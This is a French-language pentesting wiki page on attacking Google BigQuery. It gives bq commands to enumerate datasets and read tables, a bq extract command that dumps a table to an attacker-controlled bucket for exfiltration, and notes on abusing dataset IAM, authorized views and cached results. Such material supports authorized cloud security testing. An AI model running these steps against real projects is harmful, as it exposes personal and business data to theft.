---
title: "BigQuery : lire des jeux de données et exfiltrer via des requêtes et des exports"
order: 2
description: "Attaquer BigQuery : lire des jeux de données et des tables, exfiltrer via des requêtes et des exports, et abuser de l'IAM des jeux de données."
keywords:
  - BigQuery
  - jeu de données
  - requête
  - export
  - IAM de jeu de données
  - exfiltration
---

# BigQuery

BigQuery est un entrepôt sans serveur accessible entièrement via IAM. Un principal disposant de `bigquery.tables.getData` et `bigquery.jobs.create` lit toute table à laquelle il est autorisé, et l'entrepôt contient généralement les données les plus précieuses : événements, données personnelles et exports analytiques. L'exfiltration ne demande qu'une requête, ou une tâche `extract` vers un bucket pour un volume important.

## Énumération et lecture

```bash
bq ls --project_id <proj>
bq ls <proj>:<dataset>
bq show --schema <proj>:<dataset>.<table>
bq query --use_legacy_sql=false 'SELECT * FROM `proj.dataset.table` LIMIT 1000'
```

## Exfiltration en masse

```bash
# dump a table to a bucket you control
bq extract --destination_format=NEWLINE_DELIMITED_JSON \
  proj:dataset.table gs://<attacker-or-reachable-bucket>/out-*.json
```

## Notes d'exploitation

- L'IAM des jeux de données est distinct de l'IAM du projet : un jeu de données partagé avec `allAuthenticatedUsers` ou un groupe étendu est lisible même sans rôle au niveau du projet.
- Les vues et routines autorisées peuvent laisser fuir des lignes de jeux de données que vous ne pouvez pas lire directement ; énumérez-les.
- Les résultats de requêtes et les tables mises en cache persistent ; `bigquery.jobs.create` plus un `SELECT` entre locataires constitue une lecture discrète.

## Outils

- **bq** / **gcloud** (`bq query`, `bq extract`).
- Bibliothèques clientes de l'**API BigQuery** pour des extractions scriptées.

## Références

- [HackTricks Cloud : GCP BigQuery](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud : GCP](https://hackingthe.cloud/)
- [Google Cloud : contrôle d'accès BigQuery](https://cloud.google.com/bigquery/docs/access-control)
